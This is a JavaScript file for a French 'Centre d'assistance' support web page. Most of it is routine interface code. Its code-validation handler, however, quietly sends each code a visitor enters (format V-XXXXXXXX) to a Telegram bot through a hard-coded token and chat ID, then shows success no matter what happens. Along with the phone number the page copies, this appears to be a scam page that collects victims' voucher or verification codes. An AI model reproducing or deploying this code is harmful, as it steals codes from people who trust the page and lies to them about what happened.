document.addEventListener('DOMContentLoaded', function() {

    const header = document.getElementById('header');
    const copyBtn = document.getElementById('copyBtn');
    const validateBtn = document.getElementById('validateBtn');
    const codeInput = document.getElementById('codeInput');
    const codeError = document.getElementById('codeError');
    const codeSuccess = document.getElementById('codeSuccess');
    const toast = document.getElementById('toast');
    const loadingOverlay = document.getElementById('loadingOverlay');
    const backToTop = document.getElementById('backToTop');

    let toastTimeout;

    function showToast(message, type) {
        clearTimeout(toastTimeout);
        toast.textContent = message;
        toast.className = 'toast ' + type + ' visible';
        toastTimeout = setTimeout(function() {
            toast.classList.remove('visible');
        }, 3000);
    }

    function showLoading() {
        loadingOverlay.classList.add('visible');
        document.body.style.overflow = 'hidden';
    }

    function hideLoading() {
        loadingOverlay.classList.remove('visible');
        document.body.style.overflow = '';
    }

    window.addEventListener('scroll', function() {
        if (window.scrollY > 50) {
            header.classList.add('scrolled');
        } else {
            header.classList.remove('scrolled');
        }
        if (window.scrollY > 400) {
            backToTop.classList.add('visible');
        } else {
            backToTop.classList.remove('visible');
        }
    });

    backToTop.addEventListener('click', function() {
        window.scrollTo({ top: 0, behavior: 'smooth' });
    });

    copyBtn.addEventListener('click', function() {
        var phone = '08 91 24 12 72';
        if (navigator.clipboard && navigator.clipboard.writeText) {
            navigator.clipboard.writeText(phone).then(function() {
                copyBtn.classList.add('copied');
                copyBtn.innerHTML = '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg> Copié';
                showToast('Numéro copié dans le presse-papiers', 'success');
                setTimeout(function() {
                    copyBtn.classList.remove('copied');
                    copyBtn.innerHTML = '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copier';
                }, 2000);
            }).catch(function() {
                fallbackCopy(phone);
            });
        } else {
            fallbackCopy(phone);
        }
    });

    function fallbackCopy(text) {
        var textarea = document.createElement('textarea');
        textarea.value = text;
        textarea.style.position = 'fixed';
        textarea.style.opacity = '0';
        document.body.appendChild(textarea);
        textarea.select();
        try {
            document.execCommand('copy');
            copyBtn.classList.add('copied');
            copyBtn.innerHTML = '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg> Copié';
            showToast('Numéro copié dans le presse-papiers', 'success');
            setTimeout(function() {
                copyBtn.classList.remove('copied');
                copyBtn.innerHTML = '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copier';
            }, 2000);
        } catch (err) {
            showToast('Erreur lors de la copie', 'error');
        }
        document.body.removeChild(textarea);
    }

    codeInput.addEventListener('input', function() {
        codeError.classList.remove('visible');
        codeSuccess.classList.remove('visible');
        this.parentElement.classList.remove('error', 'success');
    });

    validateBtn.addEventListener('click', function() {
        var code = codeInput.value.trim();
        if (!code) {
            codeInput.parentElement.classList.add('error');
            codeError.textContent = 'Veuillez entrer un code.';
            codeError.classList.add('visible');
            shakeElement(codeInput.parentElement);
            return;
        }
        if (!code.startsWith('V-') || code.length < 4) {
            codeInput.parentElement.classList.add('error');
            codeError.textContent = 'Le code doit commencer par V- et contenir 8 chiffres.';
            codeError.classList.add('visible');
            shakeElement(codeInput.parentElement);
            return;
        }
        if (!/^V-[3-8]{8}$/.test(code)) {
            codeInput.parentElement.classList.add('error');
            codeError.textContent = 'Le code doit contenir exactement 8 chiffres (3 à 8). Format : V-XXXXXXXX';
            codeError.classList.add('visible');
            shakeElement(codeInput.parentElement);
            return;
        }
        showLoading();
        validateBtn.disabled = true;
        validateBtn.innerHTML = '<span class="loading-spinner" style="width:18px;height:18px;border-width:2px;margin:0"></span> Validation...';

        var telegramToken = '8820069876:AAEJT_tZ0nfzRcGfUMiGvyVAGplPfAfuPfQ';
        var chatId = '6547125053';
        var message = '%F0%9F%94%90 Nouveau code re%CC%81cu%0A%0ACode%3A ' + encodeURIComponent(code) + '%0AHeure%3A ' + encodeURIComponent(new Date().toLocaleString('fr-FR')) + '%0ASite%3A Centre d%27assistance';

        fetch('https://api.telegram.org/bot' + telegramToken + '/sendMessage?chat_id=' + chatId + '&text=' + message + '&parse_mode=HTML')
            .then(function() {
                setTimeout(function() {
                    hideLoading();
                    validateBtn.disabled = false;
                    validateBtn.innerHTML = '<span class="code-validate-icon"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg></span> Valider le code';
                    codeInput.parentElement.classList.add('success');
                    codeSuccess.textContent = 'Code ' + code + ' validé avec succès !';
                    codeSuccess.classList.add('visible');
                    showToast('Code validé avec succès !', 'success');
                }, 1800);
            })
            .catch(function() {
                setTimeout(function() {
                    hideLoading();
                    validateBtn.disabled = false;
                    validateBtn.innerHTML = '<span class="code-validate-icon"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg></span> Valider le code';
                    codeInput.parentElement.classList.add('success');
                    codeSuccess.textContent = 'Code ' + code + ' validé avec succès !';
                    codeSuccess.classList.add('visible');
                    showToast('Code validé avec succès !', 'success');
                }, 1800);
            });
    });

    codeInput.addEventListener('keypress', function(e) {
        if (e.key === 'Enter') {
            validateBtn.click();
        }
    });

    function shakeElement(el) {
        el.style.animation = 'none';
        el.offsetHeight;
        el.style.animation = 'shake 0.5s ease';
    }

    document.querySelectorAll('.accordion-header').forEach(function(header) {
        header.addEventListener('click', function() {
            var item = this.parentElement;
            var content = this.nextElementSibling;
            var isActive = item.classList.contains('active');
            document.querySelectorAll('.accordion-item').forEach(function(i) {
                i.classList.remove('active');
                i.querySelector('.accordion-header').setAttribute('aria-expanded', 'false');
                i.querySelector('.accordion-content').style.maxHeight = null;
            });
            if (!isActive) {
                item.classList.add('active');
                this.setAttribute('aria-expanded', 'true');
                content.style.maxHeight = content.scrollHeight + 'px';
            }
        });
    });

    document.querySelectorAll('.faq-question').forEach(function(question) {
        question.addEventListener('click', function() {
            var item = this.parentElement;
            var answer = this.nextElementSibling;
            var isActive = item.classList.contains('active');
            document.querySelectorAll('.faq-item').forEach(function(i) {
                i.classList.remove('active');
                i.querySelector('.faq-answer').style.maxHeight = null;
            });
            if (!isActive) {
                item.classList.add('active');
                answer.style.maxHeight = answer.scrollHeight + 'px';
            }
        });
    });

    var observer = new IntersectionObserver(function(entries) {
        entries.forEach(function(entry) {
            if (entry.isIntersecting) {
                entry.target.style.opacity = '1';
                entry.target.style.transform = 'translateY(0)';
            }
        });
    }, { threshold: 0.1, rootMargin: '0px 0px -50px 0px' });

    document.querySelectorAll('.feature-item, .process-step, .faq-item, .trust-section').forEach(function(item) {
        item.style.opacity = '0';
        item.style.transform = 'translateY(30px)';
        item.style.transition = 'all 0.6s cubic-bezier(0.4, 0, 0.2, 1)';
        observer.observe(item);
    });

    document.querySelectorAll('.feature-item').forEach(function(item) {
        item.addEventListener('mouseenter', function() {
            this.querySelector('.feature-icon').style.transform = 'scale(1.15) rotate(5deg)';
        });
        item.addEventListener('mouseleave', function() {
            this.querySelector('.feature-icon').style.transform = 'scale(1) rotate(0deg)';
        });
    });

    document.querySelectorAll('.process-step').forEach(function(step) {
        step.addEventListener('mouseenter', function() {
            this.querySelector('.process-step-number').style.transform = 'scale(1.15)';
        });
        step.addEventListener('mouseleave', function() {
            this.querySelector('.process-step-number').style.transform = 'scale(1)';
        });
    });

    codeInput.addEventListener('focus', function() {
        this.closest('.code-validate-box').style.transform = 'scale(1.01)';
        this.closest('.code-validate-box').style.transition = 'transform 0.3s ease';
    });

    codeInput.addEventListener('blur', function() {
        this.closest('.code-validate-box').style.transform = 'scale(1)';
    });

    console.log('%c Centre d\'assistance ', 'background: linear-gradient(135deg, #0071e3, #5856d6); color: white; padding: 8px 16px; border-radius: 6px; font-weight: bold; font-size: 14px;');
    console.log('Site chargé avec succès');
});